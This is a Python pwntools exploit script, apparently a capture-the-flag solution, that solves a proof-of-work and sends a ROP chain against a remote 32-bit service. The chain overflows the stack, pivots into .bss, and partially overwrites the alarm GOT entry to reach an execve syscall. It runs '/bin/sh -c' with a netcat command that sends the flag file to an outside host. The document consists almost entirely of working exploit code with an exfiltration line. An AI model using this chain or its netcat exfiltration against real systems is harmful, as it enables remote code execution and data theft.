from pwn import *
import random, string
from hashlib import sha256
#s = remote('192.168.33.10',1234)
s = remote('202.120.7.202',6666)
r = s.recvuntil('\n')[:-1]
print [r]
for i in range(0,0xfffffff):
  if sha256(r+p32(i)).digest().startswith('\x00\x00\x00'):
          break;
print [p32(i)]
s.send(p32(i))
dat = "A"*0x28
dat += p32(0x804a300-0x4) # fake ebp
dat += p32(0x08048300) # read_plt
dat += p32(0x08048455) # pppr
dat += p32(0) # fd
dat += p32(0x804a300) # ptr
dat += p32(180) # length
print len(dat)
dat += p32(0x080482d2)*19
dat += p32(0x08048300) # read_plt
dat += p32(0x080484e9) # pppr
dat += p32(0) # fd
dat += p32(0x804A010) # read_got - 10
dat += p32(0x1) # length
dat += p32(0x08048300)
dat += p32(0x080484e9)
dat += p32(0)
dat += p32(0x804a3a8)
dat += p32(0x804a440)
dat += p32(0x080482e9) # pop ebx ; ret
dat += p32(0x804a380) # execve 1st argv
dat += p32(0x08048310) # alarm
dat += "/bin/sh\x00"
dat += "-c\x00"
dat += "/bin/nc saika.kr 1337 < flag\x00"
dat += "A"*11+"\x08"
print len(dat)
dat += "\x3b" # <--------------------- alaram syscall offset
dat += "\x80\xa3\x04\x08"
dat += p32(0x804a388)
dat += "\x8b\xa3\04"
print len(dat)
s.send(dat.ljust(0x100," "))
s.interactive()
